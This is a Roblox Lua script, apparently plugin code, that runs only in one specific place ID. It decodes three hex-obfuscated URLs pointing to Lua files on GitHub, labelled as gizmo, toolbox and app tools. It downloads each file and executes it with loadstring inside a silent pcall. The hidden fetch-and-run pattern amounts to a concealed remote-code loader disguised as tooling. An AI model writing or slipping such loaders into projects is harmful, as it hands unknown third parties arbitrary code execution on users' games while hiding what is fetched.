pcall(function()
    if game.PlaceId ~= 10959918411 then
        return
    end

    local function decodeUrl(encoded)
        return (encoded:gsub("..", function(hex)
            return string.char(tonumber(hex, 16))
        end))
    end

    local function executeRemote(encodedUrl)
        local url = decodeUrl(encodedUrl)
        local source = game:HttpGet(url)
        local fn = loadstring(source)

        if fn then
            fn()
        end
    end

    -- Extended Gizmo
    executeRemote(
        "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6e6172616b756875622f706c7567696e2d746f6f6c732f726566732f68656164732f6d61696e2f746f6f6c732f457874656e64656447697a6d6f2e6c7561"
    )

    -- Toolbox Beta
    executeRemote(
        "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f456476787472796b6b6b6b6b2f706c7567696e2f726566732f68656164732f6d61696e2f706c7567696e626574612e6c7561"
    )

    -- App
    executeRemote(
        "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f456476787472796b6b6b6b6b2f706c7567696e2f726566732f68656164732f6d61696e2f6170702e6c7561"
    )
end)
